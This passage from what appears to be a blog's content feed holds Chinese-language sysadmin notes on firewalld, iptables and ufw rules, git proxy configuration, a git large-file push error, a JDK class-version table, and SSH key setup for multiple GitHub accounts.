href="#firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent</h5><h4 id="查询支持的zone"><a href="#查询支持的zone" class="headerlink" title="查询支持的zone"></a>查询支持的zone</h4><p>firewall-cmd –get-zones</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd <span class="hljs-comment">--get-zones</span><br>block dmz <span class="hljs-keyword">drop</span> <span class="hljs-keyword">external</span> home <span class="hljs-type">internal</span> nm-shared <span class="hljs-built_in">public</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">work</span><br></code></pre></td></tr></table></figure><h4 id="查询服务是否支持"><a href="#查询服务是否支持" class="headerlink" title="查询服务是否支持"></a>查询服务是否支持</h4><h5 id="firewall-cmd-–query-service-servicename"><a href="#firewall-cmd-–query-service-servicename" class="headerlink" title="firewall-cmd –query-service servicename"></a>firewall-cmd –query-service servicename</h5><p>firewall-cmd –query-service ftp</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ftp<br>no<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ssh<br>yes<br></code></pre></td></tr></table></figure><h4 id="临时开启服务"><a href="#临时开启服务" class="headerlink" title="临时开启服务"></a>临时开启服务</h4><p>firewall-cmd –add-service&#x3D;serviceName</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@localhost tmp]# firewall-cmd --query-service ftp<br>no<br>[root@localhost tmp]# firewall-cmd --add-service=ftp<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>[root@localhost tmp]# firewall-cmd --query-service ftp<br>yes<br></code></pre></td></tr></table></figure><h4 id="永久开启服务"><a href="#永久开启服务" class="headerlink" title="永久开启服务"></a>永久开启服务</h4><h5 id="firewall-cmd-–add-service-servicename-–permanent"><a href="#firewall-cmd-–add-service-servicename-–permanent" class="headerlink" title="firewall-cmd –add-service&#x3D;servicename –permanent"></a><strong>firewall-cmd –add-service&#x3D;servicename –permanent</strong></h5><p>firewall-cmd –add-service&#x3D;ftp –permanent     ##永久开放ftp服务</p><h4 id="永久添加端口"><a href="#永久添加端口" class="headerlink" title="永久添加端口"></a>永久添加端口</h4><h5 id="firewall-cmd-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent"></a><strong>firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent</strong></h5><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="删除防火墙策略"><a href="#删除防火墙策略" class="headerlink" title="删除防火墙策略"></a>删除防火墙策略</h4><p>–remove-rich-rule 参数</p><p>firewall-cmd –permanent –remove-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”3306” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@nvm- /]# firewall-cmd --permanent <span class="hljs-attribute">--remove-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot;<span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3306&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h4 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h4><h5 id="firewall-cmd-–version（必须在防火墙启动的情况下才有结果）"><a href="#firewall-cmd-–version（必须在防火墙启动的情况下才有结果）" class="headerlink" title="firewall-cmd –version（必须在防火墙启动的情况下才有结果）"></a><strong>firewall-cmd –version</strong>（必须在防火墙启动的情况下才有结果）</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--version</span><br><span class="hljs-number">1.1</span><span class="hljs-selector-class">.1</span><br></code></pre></td></tr></table></figure><h4 id="防火墙策略文件位置"><a href="#防火墙策略文件位置" class="headerlink" title="防火墙策略文件位置"></a>防火墙策略文件位置</h4><h5 id="etc-firewalld-zones"><a href="#etc-firewalld-zones" class="headerlink" title="&#x2F;etc&#x2F;firewalld&#x2F;zones"></a><strong>&#x2F;etc&#x2F;firewalld&#x2F;zones</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">(base) [root@110 ~]# cat /etc/firewalld/zones/public.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">zone</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>Public<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>For use in public areas. You do not trust the other computers on networks to not harm your computer. Only selected incoming connections are accepted.<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ssh&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dhcpv6-client&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">family</span>=<span class="hljs-string">&quot;ipv4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">address</span>=<span class="hljs-string">&quot;0.0.0.0/0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">port</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;21&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">reject</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">zone</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="查看当前防火墙策略组"><a href="#查看当前防火墙策略组" class="headerlink" title="查看当前防火墙策略组"></a>查看当前防火墙策略组</h4><p>firewall-cmd –get-default-zone</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@nvm</span><span class="hljs-operator">-</span> logs]# firewall<span class="hljs-operator">-</span>cmd <span class="hljs-operator">--</span><span class="hljs-keyword">get</span><span class="hljs-operator">-</span><span class="hljs-keyword">default</span><span class="hljs-operator">-</span>zone<br><span class="hljs-keyword">public</span><br></code></pre></td></tr></table></figure><h4 id="设置IP和端口策略"><a href="#设置IP和端口策略" class="headerlink" title="设置IP和端口策略"></a>设置IP和端口策略</h4><h5 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”172.26.208.22” port protocol&#x3D;”tcp” port&#x3D;”11” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;172.26.208.22&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;11&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="允许"><a href="#允许" class="headerlink" title="允许"></a>允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”5601” accept”</p><p>sudo firewall-cmd –zone&#x3D;public –add-rich-rule&#x3D;’rule family&#x3D;”ipv4” source address&#x3D;”1.1.1.1” port protocol&#x3D;”tcp” port&#x3D;”3306” accept’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;10.222.28.0/24&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3390&quot;</span> accept<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="网段允许"><a href="#网段允许" class="headerlink" title="网段允许"></a>网段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”80” accept”</p><h5 id="端口段允许"><a href="#端口段允许" class="headerlink" title="端口段允许"></a>端口段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”50000-60000” accept”</p><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="安装防火墙"><a href="#安装防火墙" class="headerlink" title="安装防火墙"></a>安装防火墙</h4><p>yum -y install iptables-services</p><h5 id="增加规则"><a href="#增加规则" class="headerlink" title="增加规则"></a>增加规则</h5><p>如果要修改防火墙配置，如增加防火墙端口3306</p><p>vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables </p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT</p><p>保存退出后</p><p>systemctl restart iptables.service #重启防火墙使配置生效</p><p>systemctl enable iptables.service #设置防火墙开机启动</p><p>最后重启系统使设置生效即可。</p><p>增加防火墙</p><p>[root@localhost opt]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>[root@localhost opt]# service iptables status<br>Table: filter<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt source               destination<br>1    ACCEPT     tcp  –  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:80 </p><p>Chain FORWARD (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>Chain OUTPUT (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>删除防火墙</p><p>iptables -D INPUT [NUM]</p><p>允许IP段</p><p>iptables -A INPUT -s 10.222.28.0&#x2F;24 -p tcp –dport 3390 -j ACCEPT</p><p>iptables -I INPUT -s 172.16.153.57 -p tcp –dport 80 -j ACCEPT</p><p>172.16.234.56</p><p>iptables -A INPUT -p tcp –dport 8080 -j DROP</p><p>1.开放80，22，8080 端口</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 80 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 22 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 8080 -j ACCEPT</p><p>2.保存</p><p>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;iptables save</p><p>3.查看打开的端口</p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables status</p><p>4.关闭防火墙 </p><p>1） 永久性生效，重启后不会复原</p><p>开启： chkconfig iptables on</p><p>关闭： chkconfig iptables off</p><p>2） 即时生效，重启后复原</p><p>开启： service iptables start</p><p>关闭： service iptables stop</p><h4 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h4><h5 id="iptables-nL"><a href="#iptables-nL" class="headerlink" title="iptables -nL"></a>iptables -nL</h5><h4 id="清除防火墙规则"><a href="#清除防火墙规则" class="headerlink" title="清除防火墙规则"></a>清除防火墙规则</h4><h5 id="iptables-F"><a href="#iptables-F" class="headerlink" title="iptables -F"></a>iptables -F</h5><h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="安装-ufw"><a href="#安装-ufw" class="headerlink" title="安装 ufw"></a>安装 ufw</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ufw<br></code></pre></td></tr></table></figure><h3 id="查看防火墙状态-ufw-status"><a href="#查看防火墙状态-ufw-status" class="headerlink" title="查看防火墙状态 ufw status"></a>查看防火墙状态 ufw status</h3><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>阻止的策略优先于允许的策略</p><p><a href="https://blog.csdn.net/lql971203/article/details/84450960">https://blog.csdn.net/lql971203/article/details/84450960</a></p><p><a href="https://blog.csdn.net/lql971203/article/details/84451028">https://blog.csdn.net/lql971203/article/details/84451028</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>firewalld</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_base/"/>
    <url>/2024/03/15/yunwei/applications/git/git_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><h2 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h2><h3 id="git-config-l"><a href="#git-config-l" class="headerlink" title="git config -l"></a>git config -l</h3><p>返回所有配置信息</p><p>返回值为key&#x3D;value格式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">[root<span class="hljs-variable">@localhost</span> software]<span class="hljs-comment"># git config --global -l</span><br>http.https:<span class="hljs-regexp">//gi</span>thub.com.proxy=socks5:<span class="hljs-regexp">//</span><span class="hljs-number">10.222</span><span class="hljs-number">.28</span>.<span class="hljs-number">7</span>:<span class="hljs-number">1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-get-keyname"><a href="#git-config-get-keyname" class="headerlink" title="git config get keyname"></a>git config get keyname</h3><p>返回指定key的value</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@localhost</span> software]# git config --global --<span class="hljs-keyword">get</span> http.https:<span class="hljs-comment">//github.com.proxy</span><br>socks5:<span class="hljs-comment">//10.222.28.7:1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-–global-–unset-keyname"><a href="#git-config-–global-–unset-keyname" class="headerlink" title="git config –global –unset keyname"></a>git config –global –unset keyname</h3><p>取消指定key的配置</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --unset http.https:<span class="hljs-comment">//github.com.proxy</span></span><br>[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --get http.https:<span class="hljs-comment">//github.com.proxy</span></span><br></code></pre></td></tr></table></figure><h2 id="清除本地缓存"><a href="#清除本地缓存" class="headerlink" title="清除本地缓存"></a>清除本地缓存</h2><p><strong>git rm -r –cached .</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_error/"/>
    <url>/2024/03/15/yunwei/applications/git/git_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对日常使用git过程中遇到的问题及解决方案记录总结</p><h2 id="CentOS-无法-git-clone"><a href="#CentOS-无法-git-clone" class="headerlink" title="CentOS 无法 git clone"></a>CentOS 无法 git clone</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、设置socket5代理</p><p>git config –global http.<a href="https://github.com.proxy/">https://github.com.proxy</a> socks5:&#x2F;&#x2F;10.222.28.7:1081</p><p>2、取消代理</p><p>git config –global –unset http.proxy git config –global –unset https.proxy</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] 设置代理解决github被墙 TjFish 2022-03-15 21:57</p><p>链接：<a href="https://zhuanlan.zhihu.com/p/481574024">https://zhuanlan.zhihu.com/p/481574024</a></p><h2 id="上传文件过大"><a href="#上传文件过大" class="headerlink" title="上传文件过大"></a>上传文件过大</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a><strong>报错信息</strong></h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  studynote git:(main) git push <br>枚举对象中: <span class="hljs-number">834</span>, 完成.<br>对象计数中: <span class="hljs-number">100</span>% (<span class="hljs-number">834</span><span class="hljs-operator">/</span><span class="hljs-number">834</span>), 完成.<br>使用 <span class="hljs-number">8</span> 个线程进行压缩<br>压缩对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">829</span><span class="hljs-operator">/</span><span class="hljs-number">829</span>), 完成.<br>写入对象中: <span class="hljs-number">100</span>% (<span class="hljs-number">831</span><span class="hljs-operator">/</span><span class="hljs-number">831</span>), <span class="hljs-number">467.85</span> MiB | <span class="hljs-number">1.09</span> MiB<span class="hljs-operator">/</span>s, 完成.<br>总共 <span class="hljs-number">831</span>（差异 <span class="hljs-number">13</span>），复用 <span class="hljs-number">0</span>（差异 <span class="hljs-number">0</span>），包复用 <span class="hljs-number">0</span><br><span class="hljs-params">remote:</span> Resolving <span class="hljs-params">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">13</span><span class="hljs-operator">/</span><span class="hljs-number">13</span>), done.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">Trace:</span> b0be7add97db98c12a70ff80495a417f07375427385a833f1e5978a2830b3fb7<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> See https:<span class="hljs-symbol">//gh.io/lfs</span> for more information.<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> File security<span class="hljs-symbol">/secResources/PPT/FireShot</span> Capture <span class="hljs-number">001</span> <span class="hljs-operator">-</span> 华为Anti-DDoS方案技术白皮书-V600R21C10 <span class="hljs-operator">-</span> 华为企业业务 <span class="hljs-operator">-</span> e.huawei.com.pdf is <span class="hljs-number">309.68</span> MB; this exceeds GitHub&#x27;s file size limit of <span class="hljs-number">100.00</span> MB<br><span class="hljs-params">remote:</span> <span class="hljs-params">error:</span> <span class="hljs-params">GH001:</span> Large files detected. You may want to try Git Large File Storage <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//git-lfs.github.com.</span><br>To ncgithub.com:C0isini<span class="hljs-symbol">/studynote.git</span><br> <span class="hljs-operator">!</span> [remote rejected] main <span class="hljs-operator">-&gt;</span> main (pre-receive hook declined)<br>错误：无法推送一些引用到 &#x27;ncgithub.com:C0isini<span class="hljs-operator">/</span>studynote.git&#x27;<br></code></pre></td></tr></table></figure><p>清除本地缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
      <tag>error</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jdk_base</title>
    <link href="/2024/03/15/yunwei/applications/java/jdk_base/"/>
    <url>/2024/03/15/yunwei/applications/java/jdk_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="JDK版本信息"><a href="#JDK版本信息" class="headerlink" title="JDK版本信息"></a>JDK版本信息</h2><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">JDK版本</td><td align="center">major.minor version</td><td align="center">十六进制表示</td></tr><tr><td align="center">1.1</td><td align="center">45</td><td align="center">0x2D hex</td></tr><tr><td align="center">1.2</td><td align="center">46</td><td align="center">0x2E hex</td></tr><tr><td align="center">1.3</td><td align="center">47</td><td align="center">0x2F hex</td></tr><tr><td align="center">1.4</td><td align="center">48</td><td align="center">0x30 hex</td></tr><tr><td align="center">1.5</td><td align="center">49</td><td align="center">0x31 hex</td></tr><tr><td align="center">1.6</td><td align="center"><em><strong>50</strong></em></td><td align="center">0x32 hex</td></tr><tr><td align="center">1.7</td><td align="center">51</td><td align="center">0x33 hex</td></tr><tr><td align="center">Java8</td><td align="center">52</td><td align="center">0x34 hex</td></tr><tr><td align="center">Java9</td><td align="center">53</td><td align="center"></td></tr><tr><td align="center">Java10</td><td align="center">54</td><td align="center"></td></tr><tr><td align="center">Java11</td><td align="center">55</td><td align="center"></td></tr><tr><td align="center">Java12</td><td align="center">56</td><td align="center"></td></tr><tr><td align="center">Java13</td><td align="center">57</td><td align="center"></td></tr><tr><td align="center">Java14</td><td align="center">58</td><td align="center"></td></tr><tr><td align="center">Java15</td><td align="center">59</td><td align="center"></td></tr><tr><td align="center">Java16</td><td align="center">60</td><td align="center"></td></tr><tr><td align="center">Java17</td><td align="center">61</td><td align="center"></td></tr><tr><td align="center">Java18</td><td align="center">62</td><td align="center"></td></tr><tr><td align="center">这里只需要记住JDK11的版本号是55,以此为基准上下加减进行即可!</td><td align="center"></td><td align="center"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>jdk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_tips</title>
    <link href="/2024/03/15/yunwei/applications/git/git_tips/"/>
    <url>/2024/03/15/yunwei/applications/git/git_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="配置多个账号"><a href="#配置多个账号" class="headerlink" title="配置多个账号"></a>配置多个账号</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>mac 电脑配置多个github账号 ssh</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><h3 id="生成不同账号密钥"><a href="#生成不同账号密钥" class="headerlink" title="生成不同账号密钥"></a>生成不同账号密钥</h3><p>ssh-keygen -t rsa -C “github登录邮箱” -f ~&#x2F;.ssh&#x2F;id_rsa_密钥名称，生成不同账号的密钥，只需要修改 “github登录邮箱”和“密钥名称”即可</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119<span class="hljs-variable">@proton</span>.me&quot;</span> -f ~<span class="hljs-regexp">/.ssh/id</span>_rsa_moss119<br></code></pre></td></tr></table></figure><p>会生成私钥 id_rsa_密钥名称、公钥 id_rsa_密钥名称_pub</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">➜  .ssh ssh-keygen -t rsa -C <span class="hljs-string">&quot;pr0t0n119@proton.me&quot;</span> -f ~/.ssh/id_rsa_moss119<br>Generating public/private rsa key pair.<br>Enter passphrase (empty for no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved in /Users/admin/.ssh/id_rsa_moss119<br>Your public key has been saved in /Users/admin/.ssh/id_rsa_moss119.pub<br>The key fingerprint is:<br>SHA256:OgJRf1mQeTWUV+aBbqmaEHcX++qtnONdan/JBzzrIeg pr0t0n119<span class="hljs-meta">@proton.me</span><br>The key&#x27;s randomart image is:<br>+---[RSA 3072]----+<br>|<span class="hljs-string">    .   .+.o+..oo</span>|<br>|<span class="hljs-string">   . .  oo. .+.o.</span>|<br>|<span class="hljs-string">  .   . o.  ..+ .</span>|<br>|<span class="hljs-string">   .   o . . *   </span>|<br>|<span class="hljs-string">  .     S . +..  </span>|<br>|<span class="hljs-string">   .   o   o  +. </span>|<br>|<span class="hljs-string">    . o . + . ++o</span>|<br>|<span class="hljs-string">     . . +  .+*=+</span>|<br>|<span class="hljs-string">          E oO=++</span>|<br>+----[SHA256]-----+<br></code></pre></td></tr></table></figure><h3 id="公钥写入对应GitHub"><a href="#公钥写入对应GitHub" class="headerlink" title="公钥写入对应GitHub"></a>公钥写入对应GitHub</h3><p>配置链接，账号settings-&gt;SSH and GPG keys-&gt;SSH keys-&gt;New SSH Key</p><p><a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p><p>title：可以随意填写</p><p>Key type：默认 Authentication Key</p><p>Key：公钥 id_rsa_密钥名称_pub的内容</p><h3 id="配置-ssh-config-文件"><a href="#配置-ssh-config-文件" class="headerlink" title="配置 ssh config 文件"></a>配置 ssh config 文件</h3><h4 id="文件位置"><a href="#文件位置" class="headerlink" 